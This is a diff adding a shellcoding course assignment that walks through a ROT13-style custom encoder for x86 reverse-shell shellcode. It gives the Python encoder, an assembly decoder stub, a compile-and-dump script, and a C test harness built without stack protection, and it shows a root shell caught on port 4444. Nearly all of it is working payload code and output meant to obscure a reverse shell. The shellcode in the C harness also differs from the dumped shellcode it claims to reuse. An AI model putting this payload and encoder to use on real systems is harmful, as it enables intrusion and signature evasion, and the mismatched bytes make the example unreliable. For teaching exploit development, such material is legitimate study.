@@ -1328,3 +1328,214 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 I hope you enjoyed learning about egghunters and implementing them using shellcode!
+
+
+
+
+
+# Assignment 4
+
+# Custom Encoder Requirements
+- Create a custom encoding scheme like the “Insertionon Encoder”
+- PoC with using execve-stack as the shellcode to encode with your schema and execute
+
+## Prerequisites
+
+- Basic understanding of registers
+- Basic understanding of stack and memory
+- Basic understanding of assembly
+
+
+## Approach
+
+There are potentially dozens if not hundreds of methods you could use to encode our shellcode. For this assignment, I decided to go with an easy yet versatile method. The ROT13 cipher.
+
+ROT13 ("rotate by 13 places") is a simple letter substitution cipher that replaces a letter with the 13th letter after it in the alphabet. 
+
+Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13 is its own inverse; that is, to undo ROT13, the same algorithm is applied, so the same action can be used for encoding and decoding.
+
+This is exactly what we would like to apply in our custom encoder.
+
+## Encoder
+
+We'll start by creating our encoder, we'll be using python for this as it's a user friendly language and easy to create quick code in.
+
+Our shellcode will be the reverse shell we created in Assignment 2. Don't worry though, this writeup is only about our custom encoder so you don't have to worry about creating the reverse shell. Just use my example here:
+
+```
+#!/usr/env/python
+shellcode = ("\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x01\x01\x02\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80")
+
+rot13 = 13
+maxHexSize = 256 - rot13
+
+encoded = ""
+encodedASM = ""
+
+for hexbyte in bytearray(shellcode):
+	if hexbyte < maxHexSize:
+		encoded += "\\x%02x" % (hexbyte + rot13)
+		encodedASM += "0x%02x," % (hexbyte + rot13)
+	else:
+		encoded += "\\x%02x" % (rot13 - 256 + hexbyte)
+		encodedASM += "0x%02x," % (rot13 - 256 + hexbyte)
+
+
+print "\n[+] Rot13 encoded shellcode is: " + encoded
+print "[+] Len: " + str(len(bytearray(shellcode)))
+print "\n[+] Assembly format is: " + encodedASM
+print "[+] Len: " + str(len(bytearray(shellcode)))
+```
+
+If we execute the encoder script we receive our well formatted shellcode:
+
+```
+root@ubuntu:/mnt/hgfs/assembly/exam/4-Assignment# python encoder-rot13.py 
+
+[+] Rot13 encoded shellcode is: \x3e\xcd\xbd\x73\x3e\xe8\xc0\x0e\x3e\xd6\x5e\x60\x77\x0f\x96\xee\xda\x8d\x3e\x0c\x96\xd4\x3e\xcd\xbd\x73\x3e\xd6\xc6\x8d\x0e\x0e\x0f\x8e\xf6\x0e\x0e\x0e\x0e\x5e\x73\x75\x1e\x69\x50\x73\x60\x96\xee\x77\x1d\x5e\x64\x96\xee\x50\xda\x8d\x3e\xd6\xbe\x0f\x3e\xcd\xbd\x4c\xda\x8d\x56\x86\x06\x3e\xcd\xbd\x18\x3e\xe8\x60\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x3e\xd6\x3e\xdf\xda\x8d
+[+] Len: 96
+
+[+] Assembly format is: 0x3e,0xcd,0xbd,0x73,0x3e,0xe8,0xc0,0x0e,0x3e,0xd6,0x5e,0x60,0x77,0x0f,0x96,0xee,0xda,0x8d,0x3e,0x0c,0x96,0xd4,0x3e,0xcd,0xbd,0x73,0x3e,0xd6,0xc6,0x8d,0x0e,0x0e,0x0f,0x8e,0xf6,0x0e,0x0e,0x0e,0x0e,0x5e,0x73,0x75,0x1e,0x69,0x50,0x73,0x60,0x96,0xee,0x77,0x1d,0x5e,0x64,0x96,0xee,0x50,0xda,0x8d,0x3e,0xd6,0xbe,0x0f,0x3e,0xcd,0xbd,0x4c,0xda,0x8d,0x56,0x86,0x06,0x3e,0xcd,0xbd,0x18,0x3e,0xe8,0x60,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x3e,0xd6,0x3e,0xdf,0xda,0x8d,
+[+] Len: 96
+```
+
+# Decoder
+
+We'll take our encoded shellcode (in assembly format) and place it in the following assembly code under EncodedShellcode.
+
+This assembly code will load the shellcode into memory, pop it into an address and run a loop for 96 cycles which is the length of our shellcode.
+
+Once it's finished looping it'll execute "jmp short EncodedShellcode" which is now our decoded shellcode!
+
+```
+global _start
+
+section .text
+
+_start:
+	jmp short call_shellcode
+
+decoder:
+	pop esi		; pop address of shellcode into ESI
+	xor ecx,ecx	; prepare ecx loop register
+	mov cl,96	; counter = 96 (length of the shellcode)
+
+decode:
+	cmp byte [esi],13 ; compare if is possible to substract value 13
+	jl max_reached ; jump if less -> max_reached
+	sub byte [esi], 13 ; substract value 13
+	jmp short LoopOrExecute
+ 
+max_reached:
+	xor edx, edx ; zeroize EDX register
+	mov dl, 0xd ; set 13 as low byte of EDX
+	sub dl, byte [esi] ; 13 - byte value of the shellcode
+	xor ebx, ebx ; zeroize EBX register
+	mov bl, 0xff ; 0xff = 255 
+	inc ebx ; = 256
+	sub bx, dx ; 256 - (13 - byte value of the shellcode)
+	mov byte [esi], bl ; move bl into RSI
+ 
+LoopOrExecute:
+	inc esi ; move to next byte
+	loop decode ; loop "decode" if ECX > 0
+	jmp short EncodedShellcode	; when ECX = 0, Execute our now decoded shellcode
+
+call_shellcode:
+	call decoder ; push address of EncodedShellcode(0x3e,0xcd,0xbd,etc,etc*91) onto stack and move EIP to decoder.
+	EncodedShellcode: db 0x3e,0xcd,0xbd,0x73,0x3e,0xe8,0xc0,0x0e,0x3e,0xd6,0x5e,0x60,0x77,0x0f,0x96,0xee,0xda,0x8d,0x3e,0x0c,0x96,0xd4,0x3e,0xcd,0xbd,0x73,0x3e,0xd6,0xc6,0x8d,0x0e,0x0e,0x0f,0x8e,0xf6,0x0e,0x0e,0x0e,0x0e,0x5e,0x73,0x75,0x1e,0x69,0x50,0x73,0x60,0x96,0xee,0x77,0x1d,0x5e,0x64,0x96,0xee,0x50,0xda,0x8d,0x3e,0xd6,0xbe,0x0f,0x3e,0xcd,0xbd,0x4c,0xda,0x8d,0x56,0x86,0x06,0x3e,0xcd,0xbd,0x18,0x3e,0xe8,0x60,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x3e,0xd6,0x3e,0xdf,0xda,0x8d
+```
+
+## Compiling our custom encoder/decoder
+
+So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.
+
+During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
+```
+# This compiles your assembly code and dumps the shellcode 
+
+# Compile and output
+nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o
+
+# Gets shellcode from output file
+
+## Prints the shellcode in little endian
+
+RAW=$(objdump -d "$1" -M intel | grep "^ "|awk -F"[\t]" '{print $2}')
+SHELLCODE=""
+COUNT=0
+for word in $RAW
+do
+	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
+	((COUNT++))
+done
+echo ""
+echo "Shellcode: "
+echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
+echo "Shellcode size: ${COUNT} bytes"
+```
+
+
+You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile and link it like so:
+```
+root@ubuntu:/mnt/hgfs/assembly/exam/4-Assignment# ./compile-shell-dump.sh rot13-decoder
+
+Shellcode: 
+\xeb\x24\x5e\x31\xc9\xb1\x60\x80\x3e\x0d\x7c\x05\x80\x2e\x0d\xeb\x10\x31\xd2\xb2\x0d\x2a\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88\x1e\x46\xe2\xe3\xeb\x05\xe8\xd7\xff\xff\xff\x3e\xcd\xbd\x73\x3e\xe8\xc0\x0e\x3e\xd6\x5e\x60\x77\x0f\x96\xee\xda\x8d\x3e\x0c\x96\xd4\x3e\xcd\xbd\x73\x3e\xd6\xc6\x8d\x0e\x0e\x0f\x8e\xf6\x0e\x0e\x0e\x0e\x5e\x73\x75\x1e\x69\x50\x73\x60\x96\xee\x77\x1d\x5e\x64\x96\xee\x50\xda\x8d\x3e\xd6\xbe\x0f\x3e\xcd\xbd\x4c\xda\x8d\x56\x86\x06\x3e\xcd\xbd\x18\x3e\xe8\x60\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x3e\xd6\x3e\xdf\xda\x8d
+Shellcode size: 139 bytes
+```
+
+
+Now we'll take the dumped shellcode and place it in a C file, we do this to confirm it works in a C program.
+```
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x24\x5e\x31\xc9\xb1\x60\x80\x3e\x0d\x7c\x05\x80\x2e\x0d\xeb\x10\x31\xd2\xb2\x0d\x2a\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88\x1e\x46\xe2\xe3\xeb\x05\xe8\xd7\xff\xff\xff\x3e\xcd\xbd\x73\x3e\xe8\x60\x50\x60\x77\x0f\x96\xee\xda\x8d\x3e\x03\x96\xd3\xbd\x73\x68\x67\x3e\xdf\x5f\x73\x75\x1e\x69\x77\x1d\x5e\x63\x96\xee\xda\x8d\xbd\x73\xc0\x11\x63\x3e\xd6\x96\xee\xda\x8d\xbd\x73\xc0\x12\x63\x96\xee\xda\x8d\x3e\xe8\x96\xd0\x3e\xd6\xbe\x0f\xbd\x4c\xda\x8d\x56\x86\x06\x3e\xcd\xbd\x18\x3e\xe8\x60\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x3e\xd6\xda\x8d";
+
+main(){
+
+	printf("Shellcode Length: %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+
+```
+
+Once that's done we're going to need to compile it:
+```
+root@ubuntu:/mnt/hgfs/assembly/exam/4-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
+```
+
+And we're done!
+
+# Testing our custom encoder/decoder
+
+To test it we'll first open up a new terminal and open a socket to listen on our local (127.0.0.1) IP and port 4444:
+
+```
+root@ubuntu:/home/ubuntu# nc -v -l 4444
+```
+
+Now go back to your original terminal and execute your compiled C file:
+
+```
+root@ubuntu:/mnt/hgfs/assembly/exam/4-Assignment/testShellcode# ./testingShellcode
+Shellcode Length: 139
+
+```
+
+Now if we go back to our socket listener you'll see we have a reverse shell connection!
+
+Our custom encoder/decoder worked!
+
+```
+root@ubuntu:/home/ubuntu# nc -v -l 4444
+Connection from 127.0.0.1 port 4444 [tcp/*] accepted
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
+
+I hope you've enjoyed learning about custom encoders/decoders and implementing them in assembly!
+
